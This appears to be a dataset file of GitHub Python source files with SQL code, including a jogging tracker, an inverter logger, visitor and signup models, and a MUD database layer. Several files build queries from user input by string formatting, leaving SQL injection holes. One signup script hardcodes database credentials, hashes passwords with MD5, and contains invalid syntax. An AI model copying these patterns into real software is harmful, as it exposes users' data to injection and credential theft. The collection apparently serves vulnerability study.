vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/amor71/sanic_jwt_scope_w_aioredis/blob/5a0a1d32b0bea893ec9129ae5e2358b82272ba2c",
        "file_path": "/Models/user.py",
        "source": "from sqlalchemy.sql import text\nfrom .dbhelper import engine\n\n\nclass User(object):\n    def __init__(\n        self, user_id, username, hashed_password, roll_id=1, *args, **kwargs\n    ):\n        self.user_id = user_id\n        self.username = username\n        self.hashed_password = hashed_password\n        self.roll_id = roll_id\n\n    def to_dict(self):\n        return {\"user_id\": self.user_id, \"username\": self.username}\n\n    def save(self):\n        connection = engine.connect()\n        trans = connection.begin()\n        try:\n            s = text(\n                \"INSERT INTO users(username, hashed_password, roll_id) \"\n                \"VALUES(:username, :hashed_password, :roll_id)\"\n            )\n            connection.execute(\n                s,\n                username=self.username,\n                hashed_password=self.hashed_password,\n                roll_id=self.roll_id,\n            )\n            trans.commit()\n        except:\n            trans.rollback()\n            raise\n        connection.close()\n\n    @classmethod\n    def get_by_username(cls, username):\n        assert engine\n        s = text(\n            \"SELECT user_id, username, hashed_password, roll_id \"\n            \"FROM users \"\n            \"WHERE username = :username AND expire_date is null\"\n        )\n        connection = engine.connect()\n        rc = connection.execute(s, username=username).fetchone()\n        if rc is not None:\n            rc = User(rc[0], rc[1], rc[2].decode(\"utf-8\"), rc[3])\n\n        connection.close()\n        return rc\n\n    @classmethod\n    def username_exists(cls, username):\n        assert engine\n        s = text(\n            \"SELECT * \"\n            \"FROM users \"\n            \"WHERE username = :username AND expire_date is null\"\n        )\n        connection = engine.connect()\n\n        rc = (\n            False\n            if connection.execute(s, username=username).fetchone() is None\n            else True\n        )\n        connection.close()\n        return rc\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/amor71/sanic_jwt_scope_w_aioredis/blob/5a0a1d32b0bea893ec9129ae5e2358b82272ba2c",
        "file_path": "/Routes/jogging_results.py",
        "source": "import datetime\nimport json\nfrom sanic import response\nfrom sanic.exceptions import SanicException, InvalidUsage, add_status_code\nfrom sanic_jwt.decorators import protected\nfrom jogging.Contectors.darksky import get_weather_condition\nfrom jogging.Routes.auth import retrieve_user\nfrom jogging.Models.jogging_result import JoggingResult\n\n\n@add_status_code(409)\nclass Conflict(SanicException):\n    pass\n\n\n@protected()\nasync def add_jogging_result(request, *args, **kwargs):\n    if (\n        request.json is None\n        or \"date\" not in request.json\n        or \"distance\" not in request.json\n        or \"time\" not in request.json\n        or \"location\" not in request.json\n    ):\n        raise InvalidUsage(\n            \"invalid payload (should be {date, distance, time, location})\"\n        )\n\n    distance = request.json[\"distance\"]\n    if distance <= 0:\n        raise InvalidUsage(\"distance needs to be positive\")\n\n    try:\n        date = datetime.datetime.strptime(\n            request.json[\"date\"], \"%Y-%m-%d\"\n        ).date()\n    except ValueError:\n        raise InvalidUsage(\"invalid date (should be 'YYYY-MM-DD')\")\n\n    latlong = request.json[\"location\"].split(\" \")\n\n    if len(latlong) != 2:\n        raise InvalidUsage(\"invalid location (should be 'LAT LONG')\")\n\n    try:\n        lat = float(latlong[0])\n        long = float(latlong[1])\n    except ValueError:\n        raise InvalidUsage(\n            \"invalid location (lat & long should be floating-point)\"\n        )\n\n    if not (-90.0 <= lat <= 90.0 and -180 <= long <= 180):\n        raise InvalidUsage(\n            \"invalid location (The latitude must be a number between -90 and 90 and the longitude between -180 and 180)\"\n        )\n\n    try:\n        time = int(request.json[\"time\"])\n    except ValueError:\n        raise InvalidUsage(\"invalid time (time should be an integer)\")\n\n    if time <= 0:\n        raise InvalidUsage(\"invalid time (time should be positive)\")\n\n    condition = await get_weather_condition(lat, long, date)\n\n    if condition is None:\n        raise InvalidUsage(\n            \"can't fetch running conditions for that location & time\"\n        )\n\n    user_id = retrieve_user(request, args, kwargs)[\"user_id\"]\n\n    jog = JoggingResult(\n        user_id,\n        request.json[\"location\"],\n        date,\n        distance,\n        time,\n        json.dumps(condition[\"data\"][0]),\n    )\n    jog.save()\n\n    return response.HTTPResponse(status=201)\n\n\n@protected()\nasync def get_jogging_results(request, *args, **kwargs):\n    page = int(request.args[\"page\"][0]) if \"page\" in request.args else 0\n    limit = int(request.args[\"count\"][0]) if \"count\" in request.args else 10\n\n    if page < 0 or limit <= 0:\n        raise InvalidUsage(\"invalid paging (page >= 0 and count > 0)\")\n\n    q_filter = request.args[\"filter\"][0] if \"filter\" in request.args else None\n    user_id = retrieve_user(request, args, kwargs)[\"user_id\"]\n\n    return response.json(\n        JoggingResult.load(user_id, q_filter, page, limit), status=200\n    )\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/amor71/sanic_jwt_scope_w_aioredis/blob/5a0a1d32b0bea893ec9129ae5e2358b82272ba2c",
        "file_path": "/Tests/test_jogging_results.py",
        "source": "import pytest\nfrom sanic import Sanic\nimport random\nimport json\nfrom jogging.main import config_app\nfrom jogging import config\nfrom jogging.Models.user import User\n\nusername = None\naccess_token = None\nrefresh_token = None\n\n\n@pytest.yield_fixture\ndef app():\n    config.app = Sanic(\"test_sanic_app\")\n    config_app()\n    yield config.app\n\n\n@pytest.fixture\ndef test_cli(loop, app, sanic_client):\n\n    global username\n    while username is None:\n        i = random.randint(1, 10000)\n        username = f\"amichay.oren+{i}@gmail.com\"\n        if User.username_exists(username):\n            username = None\n\n    return loop.run_until_complete(sanic_client(app))\n\n\nasync def test_positive_register_(test_cli):\n    data = {\"username\": username, \"password\": \"testing123G\"}\n    resp = await test_cli.post(\"/users\", data=json.dumps(data))\n    assert resp.status == 201\n\n\nasync def test_positive_login(test_cli):\n    data = {\"username\": username, \"password\": \"testing123G\"}\n    resp = await test_cli.post(\"/auth\", data=json.dumps(data))\n    resp_json = await resp.json()\n    print(resp_json)\n    global access_token\n    access_token = resp_json[\"access_token\"]\n    global refresh_token\n    refresh_token = resp_json[\"refresh_token\"]\n    assert access_token is not None\n    assert refresh_token is not None\n    assert resp.status == 200\n\n\nasync def test_negative_jogging_result(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n    data = {\n        \"date\": \"1971-06-20\",\n        \"distance\": 2000,\n        \"time\": 405,\n        \"location\": \"32.0853 34.7818\",\n    }\n    resp = await test_cli.post(\n        \"/results\", headers=headers, data=json.dumps(data)\n    )\n    assert resp.status == 400\n\n\nasync def test_positive_jogging_result(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n    data = {\n        \"date\": \"2015-06-20\",\n        \"distance\": 2000,\n        \"time\": 405,\n        \"location\": \"32.0853 34.7818\",\n    }\n    resp = await test_cli.post(\n        \"/results\", headers=headers, data=json.dumps(data)\n    )\n    assert resp.status == 201\n\n\nasync def test_positive_load_dataset(test_cli):\n    import csv\n\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    dsreader = csv.reader(open(\"jogging_dataset.csv\"), delimiter=\",\")\n    for row in dsreader:\n        data = {\n            \"date\": row[0],\n            \"location\": row[1],\n            \"distance\": int(row[2]),\n            \"time\": int(row[3]),\n        }\n        resp = await test_cli.post(\n            \"/results\", headers=headers, data=json.dumps(data)\n        )\n        assert resp.status == 201\n\n\nasync def test_negative_jogging_result_no_uath(test_cli):\n    global access_token\n    global refresh_token\n    data = {\n        \"date\": \"2015-06-20\",\n        \"distance\": 2000,\n        \"time\": 405,\n        \"location\": \"32.0853 34.7818\",\n    }\n    resp = await test_cli.post(\"/results\", data=json.dumps(data))\n    assert resp.status == 400\n\n\nasync def test_positive_get_all_results(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\"/results\", headers=headers)\n    resp_json = await resp.json()\n\n    assert resp.status == 200\n\n\nasync def test_positive_get_paging(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\"/results?page=0&count=2\", headers=headers)\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 2\n\n    resp = await test_cli.get(\"/results?page=1&count=1\", headers=headers)\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 1\n\n\nasync def test_negative_bad_paging(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\"/results?page=-1&count=2\", headers=headers)\n    assert resp.status == 400\n\n    resp = await test_cli.get(\"/results?page=1&count=0\", headers=headers)\n    assert resp.status == 400\n\n\nasync def test_positive_check_filters(test_cli):\n    global access_token\n    global refresh_token\n    headers = {\"Authorization\": f\"Bearer {access_token}\"}\n\n    resp = await test_cli.get(\n        \"/results?page=0&count=2&filter=date eq '2019-07-15'\", headers=headers\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 1\n\n    resp = await test_cli.get(\n        \"/results?filter=(date lt '2018-01-01') AND (time lt 500)\",\n        headers=headers,\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 4\n\n    resp = await test_cli.get(\n        \"/results?filter=distance ne 2000\", headers=headers\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 8\n\n    resp = await test_cli.get(\n        \"/results?filter=distance ne 2000 and ((time lt 400) and (time gt 390))\",\n        headers=headers,\n    )\n    resp_json = await resp.json()\n    assert resp.status == 200\n    assert len(resp_json) == 0\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/klforthwind/blog-rest-api/blob/593c75877abe0a92f4c2e47c8064c66534e35a28",
        "file_path": "/rest.py",
        "source": "from flask import Flask\r\nfrom flask_restful import Api, Resource, reqparse\r\nfrom WebHandler import getHTML\r\n\r\napp = Flask(__name__)\r\napi = Api(app)\r\n\r\n# Blog REST API\r\nclass Blog(Resource):\r\n\r\n    #GET Request- Returns website in full html\r\n    def get(self, name):\r\n        return getHTML(name)\r\n        \r\n    #def post(self, name):\r\n    #def put(self, name):\r\n    #def delete(self, name):\r\n\r\n# Access the api from 198.58.107.98:6969/blog/url-name\r\napi.add_resource(Blog, \"/blog/<string:name>\")\r\n\r\napp.run(host='198.58.107.98', port=6969, debug=True)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/philipptrenz/s0-bridge/blob/02b8b7e5b48912608181242f56e3eb4981a7f274",
        "file_path": "/util/database.py",
        "source": "#!/usr/bin/python3\n\"\"\"\n\"\"\"\nimport sqlite3, pytz\nfrom datetime import datetime, timedelta\n\n\nclass Database():\n\n    def __init__(self, config):\n        self.config = config\n        self.db = sqlite3.connect(self.config.get_database_path(), check_same_thread=False)\n        self.c = self.db.cursor()\n\n    def add_inverters(self):\n        interfaces = self.config.get_connection_interfaces()\n        for source in interfaces:\n            if source[\"type\"] == \"inverter\":\n\n                query = '''\n                    INSERT OR IGNORE INTO Inverters (\n                        Serial,\n                        EToday,\n                        ETotal\n                    ) VALUES (\n                        %s,\n                        %s,\n                        %s\n                    );\n                ''' % (source[\"serial_id\"], 0, source[\"prev_etotal\"])\n                self.c.execute(query)\n\n                query = '''\n                    UPDATE Inverters\n                    SET     \n                        Name='%s', \n                        Type='%s', \n                        SW_Version='%s', \n                        Status='%s',\n                        TimeStamp='%s'\n                    WHERE Serial='%s';\n                ''' % (source[\"name\"], source[\"inverter_type\"], \"s0-bridge v0\", \"OK\", int(datetime.now().timestamp()), source[\"serial_id\"] )\n                self.c.execute(query)\n\n                self.db.commit()\n\n    def add_data(self, ts, data_points):\n        for data in data_points:\n\n            data_type = data['source']['type']\n\n            if data_type == 'inverter':\n\n                self.add_inverter_data(ts, data)\n\n            elif data_type == 'consumption':\n\n                self.add_consumption_data_row(ts, data['energy'], data['power'])\n\n    def add_inverter_data(self, ts, data):\n\n        inv_serial = data['source']['serial_id']\n        prev_ts, prev_etoday, prev_etotal = self.get_previous_yields(inv_serial)\n\n        status = 'OK'  # TODO: Generate actual status value\n\n        self.add_day_data_row(ts, data, prev_etotal)\n\n        if self.is_timestamps_from_same_day(prev_ts, ts):\n\n            self.update_inverter(inv_serial, ts, status, prev_etoday + data['energy'],  prev_etotal + data['energy'])\n\n        else:   # is new day\n\n            self.update_inverter(inv_serial, ts, status, data['energy'],  prev_etotal + data['energy'])\n            self.add_month_data_row(inv_serial, ts, prev_etoday, prev_etotal)\n\n        self.db.commit()\n\n    def add_day_data_row(self, ts, data, prev_etotal):\n\n        if data['power'] > 0:\n\n            inv_serial = data['source']['serial_id']\n            query = '''\n               INSERT INTO DayData (\n                   TimeStamp,\n                   Serial,\n                   Power,\n                   TotalYield\n               ) VALUES (\n                   %s,\n                   %s,\n                   %s,\n                   %s\n               );\n            ''' % (ts, inv_serial, data['power'],  prev_etotal + data['energy'])\n            self.c.execute(query)\n\n\n    def get_previous_yields(self, inverter_serial):\n        query = '''\n           SELECT TimeStamp, EToday, ETotal\n           FROM Inverters\n           WHERE Serial = '%s'\n        ''' % (inverter_serial)\n        self.c.execute(query)\n        data = self.c.fetchone()\n        return data[0], data[1], data[2]\n\n    def update_inverter(self, inverter_serial, ts, status, etoday, etotal):\n        query = '''\n            UPDATE Inverters\n            SET     \n                TimeStamp='%s', \n                Status='%s', \n                eToday='%s',\n                eTotal='%s'\n            WHERE Serial='%s';\n        ''' % (ts, status, etoday, etotal, inverter_serial)\n        self.c.execute(query)\n\n    def add_month_data_row(self, inverter_serial, ts, etoday, etotal):\n\n        y = datetime.fromtimestamp(ts) - timedelta(days=1)\n        y_ts = int(datetime(y.year, y.month, y.day, 23, tzinfo=pytz.utc).timestamp())\n\n        query = '''\n            INSERT INTO MonthData (\n                TimeStamp,\n                Serial,\n                DayYield,\n                TotalYield                                 \n            ) VALUES (\n                %s,\n                %s,\n                %s,\n                %s\n            );\n        ''' % (y_ts, inverter_serial, etoday, etotal)\n        self.c.execute(query)\n\n    def add_consumption_data_row(self, ts, energy_used, power_used):\n\n        if power_used > 0:\n\n            query = '''\n                INSERT OR IGNORE INTO Consumption (\n                    TimeStamp,\n                    EnergyUsed,\n                    PowerUsed                                \n                ) VALUES (\n                    %s,\n                    %s,\n                    %s\n                );\n            ''' % (ts, 0, 0)\n            self.c.execute(query)\n\n            query = '''\n                UPDATE Consumption SET \n                EnergyUsed = EnergyUsed + %s,\n                PowerUsed = PowerUsed + %s\n                WHERE TimeStamp = %s;\n            ''' % (energy_used, power_used, ts)\n\n            self.c.execute(query)\n\n            self.db.commit()\n\n\n    def is_timestamps_from_same_day(self, ts1, ts2):\n        d1 = datetime.fromtimestamp(ts1)\n        d2 = datetime.fromtimestamp(ts2)\n        return (d1.year == d2.year and d1.month == d2.month and d1.day == d2.day)\n\n    def close(self):\n        self.db.close()\n\nif __name__ == '__main__':\n    #print('nothing to do here')\n\n    import random, time\n    from config import Config\n\n    cfg = Config(config_path='../config.json')\n    db  = Database(cfg)\n\n    db.add_inverters()\n\n    test_ts = 1535932800\n\n    print(test_ts)\n\n    while True:\n\n        test_ts += 300\n        test_date = datetime.fromtimestamp(test_ts)\n\n        if test_date.hour in range(0, 8) or test_date.hour in range(18, 24): continue\n\n        watts = random.randint(50, 400)\n        test_data = [\n            {\n                'energy': int(watts),\n                'power': int(watts / 5*60),\n                'source': {\n                    \"serial_id\": \"1000000001\",\n                    \"name\": \"TEST PLANT\",\n                    \"type\": \"inverter\",\n                    \"prev_etotal\": 62,\n                    \"pulses_per_kwh\": 1000\n                }\n            },\n            {\n                'energy': int(watts),\n                'power': int(watts / 5 * 60),\n                'source': {\n                    \"serial_id\": \"1000000002\",\n                    \"name\": \"TEST CONSUMPTION COUNTER\",\n                    \"type\": \"consumption\"\n                }\n            }\n        ]\n\n        db.add_data(test_ts, test_data)\n        print(test_date.strftime(\"%y-%m-%d %H:%M:%S\"), '\\t', test_ts, '\\t', test_data[0]['energy'], '\\t', test_data[0]['power'])\n\n        time.sleep(0.1)\n\n\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/onewyoming/onewyoming/blob/c4f8bbccb76f981a1669437cb7b899031c0f4d94",
        "file_path": "/experimental/python/buford/model/visitor.py",
        "source": "from dataclasses import dataclass\n\nimport pytz\n\nfrom config import get_connection\n\n\ndef get_visit_count():\n    connection = get_connection()\n    cursor = connection.cursor()\n    cursor.execute(\n        f\"select count(*) from visitors;\")\n    rows = cursor.fetchall()\n    connection.commit()\n    connection.close()\n    return rows[0][0]\n\n\n@dataclass()\nclass Visitor:\n    ip_address: str\n    user_agent: str\n    referrer: str\n    full_path: str\n    visit_time: pytz\n\n    def on_save(self):\n        connection = get_connection()\n        cursor = connection.cursor()\n        cursor.execute(\n            f\"insert into visitors (ip_address, user_agent, referrer, full_path, visit_time) values ('{self.ip_address}', '{self.user_agent}', '{self.referrer}', '{self.full_path}', '{self.visit_time}');\")\n        connection.commit()\n        connection.close()\n        return 0\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/onewyoming/onewyoming/blob/42ca0c5899b5dd9cbd4ee89d0ffde1d704e8509a",
        "file_path": "/experimental/python/buford/model/applicant.py",
        "source": "from dataclasses import dataclass\n\nimport psycopg2\nimport pytz\n\nfrom config import get_connection\n\n\n@dataclass\nclass Applicant:\n    email: str\n    registration_time: pytz\n\n    def on_save(self) -> int:\n        connection = get_connection()\n        cursor = connection.cursor()\n        try:\n            cursor.execute(\n                f\"insert into applicants (email, registration_time) values ('{self.email}', '{self.registration_time}');\")\n            connection.commit()\n        except psycopg2.IntegrityError:\n            print(\"this email already exists\")\n            return 1\n        connection.close()\n        return 0\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/wfinch/SY306_Project2/blob/22bda826dfcc057044b18a4519dfc0e074bbef16",
        "file_path": "/process_signup_validate.py",
        "source": "#!/usr/bin/env python3\r\n\r\nimport cgi\r\nimport cgitb\r\nfrom http import cookies\r\nimport urllib.parse\r\nimport mysql.connector\r\nfrom mysql.connector import errorcode\r\nimport hashlib\r\n\r\ncgitb.enable() #provides additional security by not revealing innerworkings of code to the outside\r\n\r\nform = cgi.FieldStorage() #instantiates the form data\r\n\r\nname = form.getvalue('name')\r\nusername = form.getvalue('username')\r\npassword = form.getvalue('password')\r\npassword2 = form.getvalue('password2')\r\n\r\n\r\nuserExists = false\r\n\r\nif password == password2 && len(name)>0 && len(username)>0:\r\n    #set cookies\r\n    #set expiration time\r\n    expires = 60*60;\r\n\r\n    cookie = cookies.SimpleCookie()\r\n    cookie[\"sessionID\"] = urllib.parse.quote(Math.random())\r\n    cookie[\"username\"] = urllib.parse.quote(username)\r\n    cookie[\"username\"]['expires'] = expires\r\n\r\n    #connect to mysql database\r\n    conn = mysql.connector.connect(user='m201842', password = 'Bandit', host='midn.cyber.usna.edu', database='m201842')\r\n    cursor = conn.cursor()\r\n    cursor.execute(\"SELECT Username FROM Users\")\r\n    for row in cursor:\r\n        if row == username:\r\n            userExists = true\r\n            break\r\n    if userExists:\r\n        #redirects to signup because they didn't do so correctly.\r\n        print(\"Content-Type: text/html\")\r\n        print()\r\n        print('''\\\r\n        <html>\r\n            <head>\r\n                <script>\r\n                    alert(\"You are failed to signup correctly.\");\r\n                    alert(\"Make sure you don't already have an account\\nand that your passwords match.\");\r\n                </script>\r\n                <meta http-equiv=\"refresh\" content=\"0;url='signup.html'\"/>\r\n            </head>\r\n        </html>\r\n        ''')\r\n\r\n    else:\r\n\t#hash the password before adding to the database\r\n\thashedPassword = hashlib.md5(password.encode())\r\n        #add the user to the database\r\n        cursor.execute(\"INSERT INTO Users VALUES (\"+username+\",\"+ name+\",\"+ hashedPassword\")\")\r\n\r\n        #redirects to the message board\r\n        print(\"Content-Type: text/html\")\r\n        print()\r\n        print('''\\\r\n        <html>\r\n            <head>\r\n                <script>\r\n                    alert(\"You are now signed in as \"+username);\r\n                </script>\r\n                <meta http-equiv=\"refresh\" content=\"0;url='messageboard.py'\"/>\r\n            </head>\r\n        </html>\r\n        ''')\r\n\r\nelse:\r\n    #redirects to signup because they didn't do so correctly.\r\n    print(\"Content-Type: text/html\")\r\n    print()\r\n    print('''\\\r\n    <html>\r\n        <head>\r\n            <script>\r\n                alert(\"You are failed to signup correctly.\");\r\n                alert(\"Make sure you don't already have an account\\nand that your passwords match.\");\r\n            </script>\r\n            <meta http-equiv=\"refresh\" content=\"0;url='signup.html'\"/>\r\n        </head>\r\n    </html>\r\n    ''')\r\n\r\n#necessary for the database to not get messed up\r\ncursor.close()\r\nconn.commit()\r\nconn.close()\r\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/wfinch/SY306_Project2/blob/bb6565986f52a8bb29c11d8aade74c42bbe3a4ca",
        "file_path": "/process_signup_validate.py",
        "source": "#!/usr/bin/env python3\r\nimport re\r\nimport cgi\r\nimport cgitb\r\nfrom http import cookies\r\nimport urllib.parse\r\nimport mysql.connector\r\nfrom mysql.connector import errorcode\r\nimport hashlib\r\n\r\ncgitb.enable() #provides additional security by not revealing innerworkings of code to the outside\r\n\r\nform = cgi.FieldStorage() #instantiates the form data\r\n\r\nname = form.getvalue('name')\r\nusername = form.getvalue('username')\r\npassword = form.getvalue('password')\r\npassword2 = form.getvalue('password2')\r\n\r\n\r\nuserExists = false\r\n\r\nif password == password2 && len(name)>0 && len(username)>0:\r\n    #set cookies\r\n    #set expiration time\r\n    expires = 60*60;\r\n\r\n    cookie = cookies.SimpleCookie()\r\n    cookie[\"sessionID\"] = urllib.parse.quote(Math.random())\r\n    cookie[\"username\"] = urllib.parse.quote(username)\r\n    cookie[\"username\"]['expires'] = expires\r\n\r\n    #connect to mysql database\r\n    conn = mysql.connector.connect(user='m201842', password = 'Bandit', host='midn.cyber.usna.edu', database='m201842')\r\n    cursor = conn.cursor()\r\n    cursor.execute(\"SELECT Username FROM Users\")\r\n    for row in cursor:\r\n        if row == username:\r\n            userExists = true\r\n            break\r\n    if userExists:\r\n        #redirects to signup because they didn't do so correctly.\r\n        print(\"Content-Type: text/html\")\r\n        print()\r\n        print('''\\\r\n        <html>\r\n            <head>\r\n                <script>\r\n                    alert(\"You are failed to signup correctly.\");\r\n                    alert(\"Make sure you don't already have an account\\nand that your passwords match.\");\r\n                </script>\r\n                <meta http-equiv=\"refresh\" content=\"0;url='signup.html'\"/>\r\n            </head>\r\n        </html>\r\n        ''')\r\n\r\n    else:\r\n\t#hash the password before adding to the database\r\n\thashedPassword = hashlib.md5(password.encode())\r\n\t#Escape any < or > in the username or name\r\n        username = re.escape(username)\r\n\tname = re.escape(name)\t\r\n        #add the user to the database\r\n        cursor.execute(\"INSERT INTO Users VALUES (\"+username+\",\"+ name+\",\"+ hashedPassword\")\")\r\n\r\n        #redirects to the message board\r\n        print(\"Content-Type: text/html\")\r\n        print()\r\n        print('''\\\r\n        <html>\r\n            <head>\r\n                <script>\r\n                    alert(\"You are now signed in as \"+username);\r\n                </script>\r\n                <meta http-equiv=\"refresh\" content=\"0;url='messageboard.py'\"/>\r\n            </head>\r\n        </html>\r\n        ''')\r\n\r\nelse:\r\n    #redirects to signup because they didn't do so correctly.\r\n    print(\"Content-Type: text/html\")\r\n    print()\r\n    print('''\\\r\n    <html>\r\n        <head>\r\n            <script>\r\n                alert(\"You are failed to signup correctly.\");\r\n                alert(\"Make sure you don't already have an account\\nand that your passwords match.\");\r\n            </script>\r\n            <meta http-equiv=\"refresh\" content=\"0;url='signup.html'\"/>\r\n        </head>\r\n    </html>\r\n    ''')\r\n\r\n#necessary for the database to not get messed up\r\ncursor.close()\r\nconn.commit()\r\nconn.close()\r\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/WilkuWilku/od-web-projekt/blob/31a10f517d23aff6aef8c3f8ba98199294996274",
        "file_path": "/db/dao.py",
        "source": "import sqlite3, hashlib, random, string, uuid\nSALT_LENGTH = 32\nDATABASE_PATH = 'db/data.db'\n\ndef add_user(username, password):\n    salt = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(SALT_LENGTH))\n    password_hash = multiple_hash_password(password, salt)\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n\n    cursor.execute('''INSERT INTO UserData(username, password_hash, salt) \n                      VALUES (?, ?, ?)''', (username, password_hash, salt))\n\n    connection.commit()\n    connection.close()\n\n\ndef login(username, password):\n    #todo zabezpieczy username przed SQLinjection\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n\n    cursor.execute('''SELECT user_id, password_hash, salt FROM UserData WHERE username = ?''', [username])\n    data = cursor.fetchone()\n    if not data:\n        return None\n    user_id = data[0]\n    password_hash = data[1]\n    salt = data[2]\n    session_id = None\n\n    if multiple_hash_password(password, salt) == password_hash:\n        session_id = str(uuid.uuid4())\n        cursor.execute('UPDATE UserData SET session_id = ? WHERE user_id = ?', (session_id, user_id))\n        print('SID: '+session_id)\n        connection.commit()\n\n        cursor.execute('SELECT secure_name, uuid_filename FROM Notes WHERE user_id = ?', [user_id])\n        notes = []\n        rows = cursor.fetchall()\n        for row in rows:\n            notes.append({\n                \"file_id\": row[1].split('.')[0],\n                \"name\": row[0]\n            })\n    connection.close()\n\n    return session_id, notes\n\n\ndef logout(session_id):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('UPDATE UserData SET session_id = NULL WHERE session_id = ?', [session_id])\n    connection.commit()\n    connection.close()\n\n\ndef check_session(session_id):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('SELECT * FROM UserData WHERE session_id = ?', [session_id])\n    verified = cursor.fetchone()\n    connection.close()\n    return verified\n\n\ndef is_username_taken(username):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('SELECT * FROM UserData WHERE username = ?', [username])\n    records = cursor.fetchone()\n    connection.close()\n    return records\n\n\ndef multiple_hash_password(password, salt):\n    hash_value = password + salt\n    for _ in range(1000):\n        hash_value = hashlib.sha3_512((hash_value + password + salt).encode()).hexdigest()\n    return hash_value\n\n\ndef is_note_uuid_taken(uuid):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('SELECT * FROM Notes WHERE uuid_filename = ?', [uuid])\n    records = cursor.fetchone()\n    connection.close()\n    return records\n\n\ndef add_notes(secure_fname, file_id, username):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('''INSERT INTO Notes(secure_name, user_id, uuid_filename)\n                        VALUES (?, \n                        (SELECT user_id FROM UserData WHERE username = ?),\n                         ?)''', (secure_fname, username, file_id))\n    connection.commit()\n    connection.close()\n\n\ndef confirm_owner_of_file(file_id, session_id, username):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('''SELECT session_id, username FROM UserData WHERE user_id = \n                                (SELECT user_id FROM Notes WHERE uuid_filename = ?)''', [file_id])\n    row = cursor.fetchone()\n    connection.close()\n    return row[0] == session_id and row[1] == username\n\n\ndef get_secure_filename(file_id):\n    connection = sqlite3.connect(DATABASE_PATH)\n    cursor = connection.cursor()\n    cursor.execute('''SELECT secure_name FROM Notes WHERE uuid_filename = ?''', [file_id])\n    row = cursor.fetchone()\n    connection.close()\n    return row[0]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kyojuceles/mud/blob/e6ae414e62d312b1718c4caed4ff036a213a19b2",
        "file_path": "/db/db_processor_mysql.py",
        "source": "#db_processor_mysql.py\nimport asyncio\nimport tormysql\n\n_pool = None\n_handler = None\n\ndef set_log_handler(handler):\n    '''db    .'''\n    global _handler\n    _handler = handler\n\ndef connect_db_server(host_addr, user_id, password, db, loop):\n    '''db pool .'''\n    global _pool\n    _pool = tormysql.ConnectionPool(\n        max_connections = 20,\n        idle_seconds = 7200,\n        wait_connection_timeout = 3,\n        host = host_addr,\n        user = user_id,\n        passwd = password,\n        db = db,\n        charset = \"utf8\")\n\n    return loop.run_until_complete(is_connect_db())\n\nasync def is_connect_db():\n    try:\n        async with await _pool.Connection():\n            pass\n    except Exception as ex:\n        _error_report(ex)\n        return False\n\n    return True\n\nasync def create_account(name: str, password: str):\n    '''db  .'''\n    global _pool\n    uid = -1\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\\\n                    \"INSERT INTO player (name, password, lv, xp, hp) values ('%s', '%s', 1, 0, 150)\"\\\n                    % (name, password))\n                uid = conn.insert_id()\n        except Exception as ex:\n            await conn.rollback()\n            _error_report(ex)\n            return False, -1  \n        await conn.commit()\n\n    return True, uid\n\nasync def get_player_info(name: str) -> tuple:\n    '''db   .'''\n    global _pool\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"SELECT uid, name, password, lv, xp, hp FROM player where name = '%s'\" % name)\n                data = cursor.fetchone()\n        except Exception as ex:\n            _error_report(ex)\n            return tuple()\n\n    if data is None:\n        return tuple()\n\n    return data\n\nasync def update_level_and_xp(name: str, lv: int, xp: int):\n    '''level, xp   .'''\n    global _pool\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"UPDATE player SET lv=%d, xp=%d where name = '%s'\" % (lv, xp, name))\n        except Exception as ex:\n            _error_report(ex)\n            return False\n        await conn.commit() \n\n    return True\n\nasync def update_hp(name: str, hp: int):\n    '''hp   .'''\n    global _pool\n    async with await _pool.Connection() as conn:\n        try:\n            async with conn.cursor() as cursor:\n                await cursor.execute(\"UPDATE player SET hp=%d where name = '%s'\" % (hp, 